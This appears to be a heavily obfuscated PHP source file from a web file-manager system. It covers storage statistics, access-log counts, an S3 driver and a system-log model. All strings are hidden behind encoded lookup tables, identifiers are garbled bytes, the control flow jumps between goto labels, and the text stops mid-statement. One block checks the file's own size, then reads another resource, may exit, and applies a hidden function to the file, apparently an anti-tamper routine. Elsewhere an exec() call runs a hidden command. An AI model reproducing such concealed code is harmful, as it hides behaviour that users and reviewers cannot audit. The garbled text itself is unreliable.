$´­ÊÂÊŸ); } private function optionFile() { $õ÷Í¼¬Ó =& $_SERVER[ÅÄÇĞô]; $÷Ö‰ÕÌº = $this->sourceSize(); $Ôî‰­¬ä = $÷Ö‰ÕÌº[$õ÷Í¼¬Ó[79]]; $ÇÄß¾Ïó = $÷Ö‰ÕÌº[$õ÷Í¼¬Ó[1931]]; $¥£àíŸÅ = Model($õ÷Í¼¬Ó[925])->where(array($õ÷Í¼¬Ó[488] => 0))->count($õ÷Í¼¬Ó[194]); $§ÎáìÄ = array($õ÷Í¼¬Ó[488] => 0, $õ÷Í¼¬Ó[234] => array($õ÷Í¼¬Ó[1114], strtotime(date($õ÷Í¼¬Ó[1938])))); $ƒ¿é·ÍÚ = Model($õ÷Í¼¬Ó[925])->where($§ÎáìÄ)->sum($õ÷Í¼¬Ó[79]); $Ã–Á²ƒ = Model($õ÷Í¼¬Ó[925])->where($§ÎáìÄ)->count($õ÷Í¼¬Ó[194]); return array($õ÷Í¼¬Ó[858] => $Ôî‰­¬ä, $õ÷Í¼¬Ó[1931] => $ÇÄß¾Ïó, $õ÷Í¼¬Ó[1963] => $Ôî‰­¬ä - $ÇÄß¾Ïó, $õ÷Í¼¬Ó[1964] => (int) $ƒ¿é·ÍÚ, $õ÷Í¼¬Ó[860] => (int) $¥£àíŸÅ, $õ÷Í¼¬Ó[1965] => (int) $Ã–Á²ƒ); } private function optionAccess() { $åÍ–ê¾ =& $_SERVER[ÅÄÇĞô]; return array($åÍ–ê¾[853] => $this->typeLogCnt(), $åÍ–ê¾[110] => $this->typeLogCnt($åÍ–ê¾[110]), $åÍ–ê¾[528] => $this->typeLogCnt($åÍ–ê¾[528]), $åÍ–ê¾[1966] => $this->typeLogCnt($åÍ–ê¾[1966]), $åÍ–ê¾[1967] => $this->typeLogCnt($åÍ–ê¾[1967]), $åÍ–ê¾[670] => $this->typeLogCnt($åÍ–ê¾[12], $åÍ–ê¾[1942])); } private function typeLogCnt($·Ú¾£½á = '', $ÁÍµ¢¯’ = "\x69\144") { $ÌÄ¦ÀÓ© =& $_SERVER[ÅÄÇĞô]; $¯†Âë = array($ÌÄ¦ÀÓ©[110] => array($ÌÄ¦ÀÓ©[1968], $ÌÄ¦ÀÓ©[1969]), $ÌÄ¦ÀÓ©[528] => array($ÌÄ¦ÀÓ©[1970], $ÌÄ¦ÀÓ©[1971]), $ÌÄ¦ÀÓ©[1966] => array($ÌÄ¦ÀÓ©[1972], $ÌÄ¦ÀÓ©[1973], $ÌÄ¦ÀÓ©[1974]), $ÌÄ¦ÀÓ©[1967] => array($ÌÄ¦ÀÓ©[1975], $ÌÄ¦ÀÓ©[1976]), $ÌÄ¦ÀÓ©[1977] => array($ÌÄ¦ÀÓ©[1978], $ÌÄ¦ÀÓ©[1979], $ÌÄ¦ÀÓ©[1980])); $§çÛ™·ş = strtotime(date($ÌÄ¦ÀÓ©[1938])); $ş›ÃÒî = array($ÌÄ¦ÀÓ©[234] => array($ÌÄ¦ÀÓ©[1114], $§çÛ™·ş)); if ($·Ú¾£½á) { $ş›ÃÒî[$ÌÄ¦ÀÓ©[33]] = array($ÌÄ¦ÀÓ©[7], $¯†Âë[$·Ú¾£½á]); } $Ô¦ÍÖ¾ = Model($ÌÄ¦ÀÓ©[1941])->where($ş›ÃÒî)->count($ÁÍµ¢¯’); return (int) $Ô¦ÍÖ¾; } private function optionServer() { $™†´áª½ =& $_SERVER[ÅÄÇĞô]; $Šêƒ³¢ = $this->diskDriver(); $¾şõÓÍµ = KodIO::defaultDriver(); $ı¦¯ùîÁ = array($™†´áª½[918] => $¾şõÓÍµ[$™†´áª½[478]]); $ë¬æÜ´ª = Model($™†´áª½[549])->where($ı¦¯ùîÁ)->sum($™†´áª½[79]); $¹¢ïßŸÈ = explode($™†´áª½[53], $_SERVER[$™†´áª½[147]]); $¸ç¢ï‡â = $¹¢ïßŸÈ[0]; $°ÜîÔ¸º = $GLOBALS[$™†´áª½[6]][$™†´áª½[21]]; $Û¹ÑÃ×Œ = $°ÜîÔ¸º[$™†´áª½[1076]]; if ($Û¹ÑÃ×Œ == $™†´áª½[1064]) { $íÉ…®¶ = explode($™†´áª½[1391], $°ÜîÔ¸º[$™†´áª½[1075]]); $Û¹ÑÃ×Œ = $íÉ…®¶[0]; } if ($Û¹ÑÃ×Œ == $™†´áª½[1012] || $Û¹ÑÃ×Œ == $™†´áª½[903]) { $øÇæ±ÄŒ = Model()->db()->query($™†´áª½[1981]); $ãÜ›ªäÓ = $øÇæ±ÄŒ[0] && isset($øÇæ±ÄŒ[0][$™†´áª½[1684]]) ? $øÇæ±ÄŒ[0][$™†´áª½[1684]] : 0; $Û¹ÑÃ×Œ = $™†´áª½[1982] . ($ãÜ›ªäÓ ? $™†´áª½[8] . $ãÜ›ªäÓ : $™†´áª½[12]); } $û—Ş¢ = $GLOBALS[$™†´áª½[6]][$™†´áª½[427]][$™†´áª½[927]]; return array($™†´áª½[1983] => $Šêƒ³¢ ? $Šêƒ³¢[$™†´áª½[1984]] : 0, $™†´áª½[1985] => $Šêƒ³¢ ? $Šêƒ³¢[$™†´áª½[1986]] : 0, $™†´áª½[1987] => (int) $¾şõÓÍµ[$™†´áª½[1984]] * 1024 * 1024 * 1024, $™†´áª½[1988] => (int) $ë¬æÜ´ª, $™†´áª½[1989] => ucfirst($¸ç¢ï‡â), $™†´áª½[1990] => $™†´áª½[1991] . PHP_VERSION, $™†´áª½[1992] => phpBuild64() ? 64 : 32, $™†´áª½[852] => str_replace($™†´áª½[1232], $™†´áª½[1092], $Û¹ÑÃ×Œ), $™†´áª½[427] => ucfirst($û—Ş¢), $™†´áª½[32] => $_SERVER[$™†´áª½[1993]]); } private function diskDriver() { $õÉ½ÍÃ¯ =& $_SERVER[ÅÄÇĞô]; $ƒ“İ¼ûÚ = $õÉ½ÍÃ¯[8]; $»…ûÏØ± = $GLOBALS[$õÉ½ÍÃ¯[6]][$õÉ½ÍÃ¯[1408]] == $õÉ½ÍÃ¯[1409]; if ($»…ûÏØ±) { $ƒ“İ¼ûÚ = $õÉ½ÍÃ¯[1994]; if (function_exists($õÉ½ÍÃ¯[1995])) { exec($õÉ½ÍÃ¯[1996], $ÈÉ‹‹); $ƒ“İ¼ûÚ = $ÈÉ‹‹[1] . $õÉ½ÍÃ¯[8]; } } if (!file_exists($ƒ“İ¼ûÚ)) { return; } if (!function_exists($õÉ½ÍÃ¯[1997])) { return; } $½€ŠÔ‡» = @disk_total_space($ƒ“İ¼ûÚ); $ôèşÌí¢ = $½€ŠÔ‡» - @disk_free_space($ƒ“İ¼ûÚ); return array($õÉ½ÍÃ¯[1984] => $½€ŠÔ‡», $õÉ½ÍÃ¯[1986] => $ôèşÌí¢); } public function fileChart($óàşäë›) { $´€ìÄ =& $_SERVER[ÅÄÇĞô]; if (isset($óàşäë›[$´€ìÄ[1797]])) { return Model($´€ìÄ[925])->userFileTypeProfile($óàşäë›[$´€ìÄ[1797]]); } if (isset($óàşäë›[$´€ìÄ[1998]])) { return Model($´€ìÄ[925])->groupFileTypeProfile($óàşäë›[$´€ìÄ[1998]]); } $·ÓÖÎ… = $this->sourceSize(); $šË€›¹— = array($´€ìÄ[193] => 0, $´€ìÄ[191] => 1); $í²ÓíØ¢ = Model($´€ìÄ[925])->where($šË€›¹—)->sum($´€ìÄ[79]); $šË€›¹—[$´€ìÄ[191]] = 2; $ª“×İ´— = Model($´€ìÄ[925])->where($šË€›¹—)->sum($´€ìÄ[79]); return array($´€ìÄ[858] => $·ÓÖÎ…[$´€ìÄ[79]], $´€ìÄ[1931] => $·ÓÖÎ…[$´€ìÄ[1931]], $´€ìÄ[1932] => (int) $í²ÓíØ¢, $´€ìÄ[1933] => (int) $ª“×İ´—); } private function sourceSize() { $¨çƒÀ¿ =& $_SERVER[ÅÄÇĞô]; $×ÓÖ¨¶ = Model($¨çƒÀ¿[925])->where(array($¨çƒÀ¿[488] => 0))->sum($¨çƒÀ¿[79]); $­‘’Ù±† = Model($¨çƒÀ¿[549])->sum($¨çƒÀ¿[79]); if ($­‘’Ù±† > $×ÓÖ¨¶) { $­‘’Ù±† = $×ÓÖ¨¶; } return array($¨çƒÀ¿[79] => (int) $×ÓÖ¨¶, $¨çƒÀ¿[1931] => (int) $­‘’Ù±†); } } goto BÄÁÛ»‹²; Bà¦Œ ‘šô: $fileSize = strrev(base64_decode($_SERVER[‹×Š·Ú¹][0])); function binCheckNeq($Ú–„”Â°, $¤ã¥ğõ‰) { return $Ú–„”Â° != $¤ã¥ğõ‰; } $_SERVER[$_SERVER[‹×Š·Ú¹][1]] = $fileSize($_SERVER[$_SERVER[‹×Š·Ú¹][2]]); goto B†°´ Ù®î; AÜ§§¡¨²‰: $_file = $_SERVER[$_SERVER[ÅÄÇĞô][835]]; $_size = $_SERVER[ÅÄÇĞô][836]; if ($_SERVER[$_SERVER[ÅÄÇĞô][837]] != $_size($_file)) { $_getc = $_SERVER[ÅÄÇĞô][838]; $_getfile = $_SERVER[$_SERVER[ÅÄÇĞô][839]] . $_SERVER[ÅÄÇĞô][840]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÅÄÇĞô][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÅÄÇĞô][688]) { $exit = $_SERVER[ÅÄÇĞô][841]; $exit(); } $_act = $_SERVER[ÅÄÇĞô][842]; $_act($_file); } goto D§†Ë°ƒ²Õ; Aæ»¿“Í: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ğªÉÂ°ê) { $«¬ÉŠ¥å =& $_SERVER[ÅÄÇĞô]; parent::__construct($ğªÉÂ°ê); $ÛÙÏİä = isset($ğªÉÂ°ê[$«¬ÉŠ¥å[259]]) && $ğªÉÂ°ê[$«¬ÉŠ¥å[259]] == $«¬ÉŠ¥å[250] ? $«¬ÉŠ¥å[250] : $«¬ÉŠ¥å[316]; $this->setSignVersion($ÛÙÏİä); } public function link($ùµÉ‚ñÏ, $³¯¤´úœ = array()) { return parent::link($ùµÉ‚ñÏ, $³¯¤´úœ); } public function fileOut($È³ß‹²·, $â¯«æ‘¥ = false, $æ†•·Ş = false, $¤é÷¾ŸË = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÅÄÇĞô][317])) { return parent::fileOutServer($È³ß‹²·, $â¯«æ‘¥, $æ†•·Ş, $¤é÷¾ŸË); } parent::fileOut($È³ß‹²·, $â¯«æ‘¥, $æ†•·Ş, $¤é÷¾ŸË); } public function fileOutImage($‚ô¹ÑŠü, $ìËç§£ò = 250) { if (strstr($this->endpoint, $_SERVER[ÅÄÇĞô][317])) { return parent::fileOutImageServer($‚ô¹ÑŠü, $ìËç§£ò); } parent::fileOutImage($‚ô¹ÑŠü, $ìËç§£ò); } public function fileOutLink($ıÜáèªÉ) { $š›Öš’‹ =& $_SERVER[ÅÄÇĞô]; if (substr($ıÜáèªÉ, 0, 7) == $š›Öš’‹[219]) { $ıÜáèªÉ = $š›Öš’‹[220] . substr($ıÜáèªÉ, 7); } header($š›Öš’‹[175] . $ıÜáèªÉ); die; } } define($_SERVER[ÅÄÇĞô][318], 1); define($_SERVER[ÅÄÇĞô][319], 2); goto a¦”ºˆÛ‚…; Dã»ğš×ÉÖ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x4c\x69\x67\150\164\x41\160\x70"; public $modelType = "\123\171\163\164\145\x6d\x4f\160\x74\151\157\x6e"; public $field = array("\156\x61\155\x65", "\x67\x72\x6f\x75\x70", "\x64\145\x73\143", "\x63\157\x6e\164\x65\x6e\164"); public function listData($Ï‚÷ïÀ· = false, $Œƒ÷î«ß = "\155\x6f\144\151\x66\171\x54\x69\155\x65", $ø’–Òë = true) { return parent::listData($Ï‚÷ïÀ·, $Œƒ÷î«ß, $ø’–Òë); } public function remove($¡ï‚Õèı) { $”ä¤õê = $this->findByName($¡ï‚Õèı); if (!$”ä¤õê) { return !1; } return parent::remove($”ä¤õê[$_SERVER[ÅÄÇĞô][478]]); } public function add($˜›Â‘š×) { if ($this->findByName($˜›Â‘š×[$_SERVER[ÅÄÇĞô][32]])) { return !1; } return parent::insert($˜›Â‘š×); } public function update($ª«À„», $¶ŒœÁ‚) { $õñœ©ìƒ =& $_SERVER[ÅÄÇĞô]; $ì±š‚µˆ = $this->findByName($ª«À„»); $È’”äÅû = $this->findByName($¶ŒœÁ‚[$õñœ©ìƒ[32]]); if (!$ì±š‚µˆ || $È’”äÅû && $È’”äÅû[$õñœ©ìƒ[478]] != $ì±š‚µˆ[$õñœ©ìƒ[478]]) { return !1; } return parent::update($ì±š‚µˆ[$õñœ©ìƒ[478]], $¶ŒœÁ‚); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\154\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\x73\145\162\164", "\x66\x75\x6e\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ò³ÊÓä£ =& $_SERVER[ÅÄÇĞô]; return array($ò³ÊÓä£[2372] => LNG($ò³ÊÓä£[2373]), $ò³ÊÓä£[2374] => LNG($ò³ÊÓä£[2375]), $ò³ÊÓä£[1940] => LNG($ò³ÊÓä£[2376]), $ò³ÊÓä£[2377] => LNG($ò³ÊÓä£[2378]), $ò³ÊÓä£[2379] => LNG($ò³ÊÓä£[2380]), $ò³ÊÓä£[2381] => LNG($ò³ÊÓä£[2382]), $ò³ÊÓä£[2383] => LNG($ò³ÊÓä£[2384]), $ò³ÊÓä£[1970] => LNG($ò³ÊÓä£[2384]), $ò³ÊÓä£[1971] => LNG($ò³ÊÓä£[2385]), $ò³ÊÓä£[2386] => LNG($ò³ÊÓä£[2387]), $ò³ÊÓä£[2388] => LNG($ò³ÊÓä£[2389]), $ò³ÊÓä£[2390] => LNG($ò³ÊÓä£[2391]), $ò³ÊÓä£[2392] => LNG($ò³ÊÓä£[2393]), $ò³ÊÓä£[1968] => LNG($ò³ÊÓä£[2394]), $ò³ÊÓä£[2395] => LNG($ò³ÊÓä£[2396]), $ò³ÊÓä£[1975] => LNG($ò³ÊÓä£[2397]), $ò³ÊÓä£[2398] => LNG($ò³ÊÓä£[2399]), $ò³ÊÓä£[2400] => LNG($ò³ÊÓä£[2401]), $ò³ÊÓä£[2402] => LNG($ò³ÊÓä£[2403]), $ò³ÊÓä£[2404] => LNG($ò³ÊÓä£[2405]), $ò³ÊÓä£[1978] => LNG($ò³ÊÓä£[2406]), $ò³ÊÓä£[1979] => LNG($ò³ÊÓä£[2407]), $ò³ÊÓä£[2408] => LNG($ò³ÊÓä£[2409]), $ò³ÊÓä£[2410] => LNG($ò³ÊÓä£[2411]), $ò³ÊÓä£[2412] => LNG($ò³ÊÓä£[2413]), $ò³ÊÓä£[1973] => LNG($ò³ÊÓä£[2414]), $ò³ÊÓä£[2415] => LNG($ò³ÊÓä£[2416]), $ò³ÊÓä£[1972] => LNG($ò³ÊÓä£[2417]), $ò³ÊÓä£[2418] => LNG($ò³ÊÓä£[2419]), $ò³ÊÓä£[2420] => LNG($ò³ÊÓä£[2421]), $ò³ÊÓä£[2422] => LNG($ò³ÊÓä£[2421]), $ò³ÊÓä£[2423] => LNG($ò³ÊÓä£[2424]), $ò³ÊÓä£[2425] => LNG($ò³ÊÓä£[2425]), $ò³ÊÓä£[2426] => LNG($ò³ÊÓä£[1944]), $ò³ÊÓä£[2427] => LNG($ò³ÊÓä£[2428]), $ò³ÊÓä£[2429] => LNG($ò³ÊÓä£[2430]), $ò³ÊÓä£[2431] => LNG($ò³ÊÓä£[2432]), $ò³ÊÓä£[2433] => LNG($ò³ÊÓä£[2434]), $ò³ÊÓä£[2435] => LNG($ò³ÊÓä£[2436]), $ò³ÊÓä£[2437] => LNG($ò³ÊÓä£[2437]), $ò³ÊÓä£[2438] => LNG($ò³ÊÓä£[2439]), $ò³ÊÓä£[2440] => LNG($ò³ÊÓä£[2441]), $ò³ÊÓä£[2442] => LNG($ò³ÊÓä£[2443]), $ò³ÊÓä£[2444] => LNG($ò³ÊÓä£[2445]), $ò³ÊÓä£[2446] => LNG($ò³ÊÓä£[2447]), $ò³ÊÓä£[2448] => LNG($ò³ÊÓä£[2449]), $ò³ÊÓä£[213] => LNG($ò³ÊÓä£[213]), $ò³ÊÓä£[214] => LNG($ò³ÊÓä£[2450]), $ò³ÊÓä£[2451] => LNG($ò³ÊÓä£[2451])); } private function typeFile() { $”ì©åúµ =& $_SERVER[ÅÄÇĞô]; $”á¶ĞÕ  = array($”ì©åúµ[1975] => array($”ì©åúµ[1976]), $”ì©åúµ[2390] => array($”ì©åúµ[2452]), $”ì©åúµ[2392] => array($”ì©åúµ[2453]), $”ì©åúµ[1968] => array($”ì©åúµ[1969], $”ì©åúµ[2454]), $”ì©åúµ[2400] => array(), $”ì©åúµ[2402] => array(), $”ì©åúµ[2404] => array(), $”ì©åúµ[1978] => array($”ì©åúµ[1980]), $”ì©åúµ[1979] => array($”ì©åúµ[1980]), $”ì©åúµ[2408] => array($”ì©åúµ[2455]), $”ì©åúµ[2410] => array($”ì©åúµ[2455]), $”ì©åúµ[2412] => array($”ì©åúµ[2456]), $”ì©åúµ[2398] => array($”ì©åúµ[2457]), $”ì©åúµ[1973] => array($”ì©åúµ[2458]), $”ì©åúµ[2415] => array($”ì©åúµ[2459]), $”ì©åúµ[1972] => array($”ì©åúµ[1974])); return $”á¶ĞÕ ; } private function typeAll() { $Çßá£„é =& $_SERVER[ÅÄÇĞô]; $Ù¡Æ…ÆÍ = $this->typeList; $ÀåçÜáå = array_filter($this->typeFile()); foreach ($ÀåçÜáå as $ÍŠè÷á’ => $Ì‰Ë¥ªƒ) { $Ù¡Æ…ÆÍ[$Ì‰Ë¥ªƒ[0]] = $Ù¡Æ…ÆÍ[$ÍŠè÷á’]; } $Ù¡Æ…ÆÍ[$Çßá£„é[1980]] = LNG($Çßá£„é[2460]); $Ù¡Æ…ÆÍ[$Çßá£„é[2455]] = LNG($Çßá£„é[2461]); return $Ù¡Æ…ÆÍ; } public function addLog($¹ğãüŸÆ, $šÒúõòŞ = array()) { $Õ¯ºÃ«ú =& $_SERVER[ÅÄÇĞô]; if (!isset($this->typeList[$¹ğãüŸÆ])) { return; } $Â®÷ÆÍÀ = Session::get($Õ¯ºÃ«ú[2139]); if (!$Â®÷ÆÍÀ) { $Â®÷ÆÍÀ = _get($šÒúõòŞ, $Õ¯ºÃ«ú[1797], 0); } if ($¹ğãüŸÆ == $Õ¯ºÃ«ú[2427] && is_array($šÒúõòŞ[$Õ¯ºÃ«ú[2462]]) && !$šÒúõòŞ[$Õ¯ºÃ«ú[2462]]) { return; } $¢ıÉ¦Àü = get_client_ip(); if (!$šÒúõòŞ || strlen(json_encode($šÒúõòŞ)) >= 1024 * 64) { if ($šÒúõòŞ && is_array($šÒúõòŞ)) { $šÒúõòŞ = array_intersect_key($šÒúõòŞ, array_flip($Õ¯ºÃ«ú[478], $Õ¯ºÃ«ú[32])); $šÒúõòŞ[$Õ¯ºÃ«ú[2463]] = $¢ıÉ¦Àü; } else { $šÒúõòŞ = array($Õ¯ºÃ«ú[2463] => $¢ıÉ¦Àü); } } else { if (is_array($šÒúõòŞ)) { $šÒúõòŞ[$Õ¯ºÃ«ú[2463]] = $¢ıÉ¦Àü; } else { $šÒúõòŞ = array($Õ¯ºÃ«ú[1310] => $šÒúõòŞ, $Õ¯ºÃ«ú[2463] => $¢ıÉ¦Àü); } } $šÒúõòŞ = array($Õ¯ºÃ«ú[1787] => Session::sign(), $Õ¯ºÃ«ú[1788] => intval($Â®÷ÆÍÀ), $Õ¯ºÃ«ú[33] => $¹ğãüŸÆ, $Õ¯ºÃ«ú[1790] => json_encode($šÒúõòŞ)); return parent::add($šÒúõòŞ); } public function remove($ì¡µãÎË) { $this->where(array($_SERVER[ÅÄÇĞô][496] => $ì¡µãÎË))->delete(); } private function _makeOrder($óÖâ¸ºî = '') { $à“´Š³ =& $_SERVER[ÅÄÇĞô]; $ï™ó˜œê = $à“´Š³[234]; $ÏØ¡áÔô = array($à“´Š³[526] => $à“´Š³[527], $à“´Š³[528] => $à“´Š³[529]); $¹ò•›‹æ = Input::get($à“´Š³[534], $à“´Š³[7], $à“´Š³[2179], array($à“´Š³[2093], $à“´Š³[528])); $¹ò•›‹æ = $ÏØ¡áÔô[$¹ò•›‹æ]; $óÖâ¸ºî = $óÖâ¸ºî . "{$ï™ó˜œê}\x20{$¹ò•›‹æ}"; return $this->order($óÖâ¸ºî); } public function get($£ôÖêõ¦ = '') { $÷»”£²¦ =& $_SERVER[ÅÄÇĞô]; if (!$£ôÖêõ¦) { show_json(array()); } $ÛÑŠŸŸı = array(); if ($£ôÖêõ¦[$÷»”£²¦[1797]]) { $ÛÑŠŸŸı[$÷»”£²¦[1797]] = $£ôÖêõ¦[$÷»”£²¦[1797]]; } if (isset($£ôÖêõ¦[$÷»”£²¦[855]])) { $àÄóÂíŸ = $£ôÖêõ¦[$÷»”£²¦[855]]; $‚ğÈÊ¬  = isset($£ôÖêõ¦[$÷»”£²¦[856]]) ? $£ôÖêõ¦[$÷»”£²¦[856]] : time(); $ÛÑŠŸŸı[$÷»”£²¦[234]] = array($÷»”£²¦[411], array($àÄóÂíŸ, $‚ğÈÊ¬ )); } if ($£ôÖêõ¦[$÷»”£²¦[33]]) { $îàäûş” = explode($÷»”£²¦[50], $£ôÖêõ¦[$÷»”£²¦[33]]); $İµÙˆ¬ = $this->typeFile(); $¼×ŞÀ Ã = array(); foreach ($îàäûş” as $˜‹÷ÈĞŞ) { $¼×ŞÀ Ã[] = $˜‹÷ÈĞŞ; if (isset($İµÙˆ¬[$˜‹÷ÈĞŞ])) { $¼×ŞÀ Ã = array_merge($¼×ŞÀ Ã, $İµÙˆ¬[$˜‹÷ÈĞŞ]); } } $¼×ŞÀ Ã = array_unique($¼×ŞÀ Ã); if ($¼×ŞÀ Ã) { $ÛÑŠŸŸı[$÷»”£²¦[33]] = array($÷»”£²¦[7], $¼×ŞÀ Ã); } } else { $ÛÑŠŸŸı[$÷»”£²¦[33]] = array($÷»”£²¦[2464], $÷»”£²¦[2465]); } if (!empty($£ôÖêõ¦[$÷»”£²¦[2463]])) { $ÛÑŠŸŸı[$÷»”£²¦[529]] = array($÷»”£²¦[462], "\45{$£ôÖêõ¦[$÷»”£²¦[2463]]}\x25"); } $Ó¦¢Ş°½ = $this->_makeOrder()->where($ÛÑŠŸŸı)->selectPage(); if (empty($Ó¦¢Ş°½[$÷»”£²¦[448]])) { show_json(array(), !0, $Ó¦¢Ş°½[$÷»”£²¦[445]]); } $Ó¦¢Ş°½[$÷»”£²¦[448]] = $this->logList($Ó¦¢Ş°½[$÷»”£²¦[448]]); return $Ó¦¢Ş°½; } private function ipAddress(&$Ë„ôÒ’€) { $Øî¢éÖè =& $_SERVER[ÅÄÇĞô]; if (!empty($Ë„ôÒ’€[$Øî¢éÖè[2463]])) { $Õôº˜€Å = IpLocation::get($Ë„ôÒ’€[$Øî¢éÖè[2463]]); } else { $Õôº˜€Å = LNG($Øî¢éÖè[2466]); } $Ë„ôÒ’€[$Øî¢éÖè[2467]] = $Õôº˜€Å; } private function descZipDownload($ÔñÅ¢§÷, &$«’§Ó Á) { $™éœäùö =& $_SERVER[ÅÄÇĞô]; if (!isset($ÔñÅ¢§÷[$™éœäùö[2468]])) { return; } $¬àè·­¹ = json_decode($ÔñÅ¢§÷[$™éœäùö[2468]], !0); foreach ($¬àè·­¹ as $†„×‘ß) { try { $Ü¹ñ•Ûî = IO::infoFullSimple($†„×‘ß[$™éœäùö[87]]); } catch (Exception $Ùºã³‡) { continue; } $ÔñÅ¢§÷[$™éœäùö[87]] = $†„×‘ß[$™éœäùö[87]]; $«’§Ó Á[] = $ÔñÅ¢§÷[$™éœäùö[194]] = $Ü¹ñ•Ûî[$™éœäùö[194]]; $«’§Ó Á[] = $ÔñÅ¢§÷[$™éœäùö[2235]] = $Ü¹ñ•Ûî[$™éœäùö[193]]; break; } return $ÔñÅ¢§÷; } private function getSourceList(&$³áëÛ…É) { $í©ÊÑ é =& $_SERVER[ÅÄÇĞô]; $öñĞ¬é¶ = array(); foreach ($³áëÛ…É as $µ®®¹‘ => $¦‘Ùñ§¹) { $éŠ¸ÛŞô = json_decode($¦‘Ùñ§¹[$í©ÊÑ é[529]], !0); if ($¦‘Ùñ§¹[$í©ÊÑ é[33]] == $í©ÊÑ é[1971]) { $éŠ¸ÛŞô = $this->descZipDownload($éŠ¸ÛŞô, $öñĞ¬é¶); $³áëÛ…É[$µ®®¹‘][$í©ÊÑ é[529]] = json_encode($éŠ¸ÛŞô); continue; } if (strpos($¦‘Ùñ§¹[$í©ÊÑ é[33]], $í©ÊÑ é[2237]) !== 0) { if (!isset($éŠ¸ÛŞô[$í©ÊÑ é[87]]) || strpos($¦‘Ùñ§¹[$í©ÊÑ é[33]], $í©ÊÑ é[2469]) !== 0) { continue; } try { $ê›Ã€Ø = IO::infoFullSimple($éŠ¸ÛŞô[$í©ÊÑ é[87]]); } catch (Exception $ñ„¦‘„ó) { continue; } $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[194]] = $ê›Ã€Ø[$í©ÊÑ é[194]]; $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[2235]] = $ê›Ã€Ø[$í©ÊÑ é[193]]; $³áëÛ…É[$µ®®¹‘][$í©ÊÑ é[529]] = json_encode($éŠ¸ÛŞô); continue; } $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[194]]; $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[2235]]; if ($éŠ¸ÛŞô[$í©ÊÑ é[33]] == $í©ÊÑ é[628]) { $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[529]][$í©ÊÑ é[1264]]; $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[529]][$í©ÊÑ é[1265]]; } if ($éŠ¸ÛŞô[$í©ÊÑ é[33]] == $í©ÊÑ é[2246]) { $öñĞ¬é¶[] = $éŠ¸ÛŞô[$í©ÊÑ é[529]][$í©ÊÑ é[194]]; } } if (!$öñĞ¬é¶) { return array(); } return Model($í©ÊÑ é[925])->sourceListInfo($öñĞ¬é¶, !0); } private function logList($ğÔ—ş“™) { $Íš‹Ê‰Ó =& $_SERVER[ÅÄÇĞô]; $×£‚¯øŠ = array_to_keyvalue($ğÔ—ş“™, $Íš‹Ê‰Ó[12], $Íš‹Ê‰Ó[1797]); $ŸïŒ° ï = Model($Íš‹Ê‰Ó[602])->userListInfo(array_unique($×£‚¯øŠ)); $Œ“†Ï÷¼ = $this->getSourceList($ğÔ—ş“™); $ó¢‡çè = $this->typeAll(); $¦ÑŸ¯éÕ = array(); $ Æ·ñÃ = array(); foreach ($ğÔ—ş“™ as $‘­ŞÚÀÆ => $Šğåë½ˆ) { $ãŞ ê˜‰ = $Šğåë½ˆ[$Íš‹Ê‰Ó[33]]; $Œ†¸ê¡æ = isset($ŸïŒ° ï[$Šğåë½ˆ[$Íš‹Ê‰Ó[1797]]]) ? $ŸïŒ° ï[$Šğåë½ˆ[$Íš‹Ê‰Ó[1797]]] : !1; $Ú´°å¦© = strpos($ãŞ ê˜‰, $Íš‹Ê‰Ó[2470]) === 0 ? LNG($Íš‹Ê‰Ó[2471]) : LNG($Íš‹Ê‰Ó[2466]); $Šğåë½ˆ[$Íš‹Ê‰Ó[32]] = isset($Œ†¸ê¡æ[$Íš‹Ê‰Ó[32]]) ? $Œ†¸ê¡æ[$Íš‹Ê‰Ó[32]] : LNG($Íš‹Ê‰Ó[2466]); $Šğåë½ˆ[$Íš‹Ê‰Ó[2297]] = isset($Œ†¸ê¡æ[$Íš‹Ê‰Ó[2297]]) ? $Œ†¸ê¡æ[$Íš‹Ê‰Ó[2297]] : $Íš‹Ê‰Ó[12]; $Šğåë½ˆ[$Íš‹Ê‰Ó[1685]] = isset($ó¢‡çè[$ãŞ ê˜‰]) ? $ó¢‡çè[$ãŞ ê˜‰] : $Ú´°å¦©; $Šğåë½ˆ[$Íš‹Ê‰Ó[2178]] = $Œ†¸ê¡æ; $Íæ¥ß¿¦ = json_decode($Šğåë½ˆ[$Íš‹Ê‰Ó[529]], !0); $Šğåë½ˆ[$Íš‹Ê‰Ó[2463]] = isset($Íæ¥ß¿¦[$Íš‹Ê‰Ó[2463]]) ? $Íæ¥ß¿¦[$Íš‹Ê‰Ó[2463]] : $Íš‹Ê‰Ó[12]; $Šğåë½ˆ[$Íš‹Ê‰Ó[2467]] = IpLocation::get($Šğåë½ˆ[$Íš‹Ê‰Ó[2463]]); if (strpos($ãŞ ê˜‰, $Íš‹Ê‰Ó[2237]) === 0 || isset($Íæ¥ß¿¦[$Íš‹Ê‰Ó[2235]])) { $Íæ¥ß¿¦[$Íš‹Ê‰Ó[90]] = $Œ“†Ï÷¼[$Íæ¥ß¿¦[$Íš‹Ê‰Ó[194]]]; $Íæ¥ß¿¦[$Íš‹Ê‰Ó[2251]] = $Œ“†Ï÷¼[$Íæ¥ß¿¦[$Íš‹Ê‰Ó[2235]]]; if ($Íæ¥ß¿¦[$Íš‹Ê‰Ó[33]] == $Íš‹Ê‰Ó[628]) { $Íæ¥ß¿¦[$Íš‹Ê‰Ó[529]][$Íš‹Ê‰Ó[1264]] = $Œ“†Ï÷¼[$Íæ¥ß¿¦[$Íš‹Ê‰Ó[529]][$Íš‹Ê‰Ó[1264]]]; $Íæ¥ß¿¦[$Íš‹Ê‰Ó[529]][$Íš‹Ê‰Ó[1265]] = 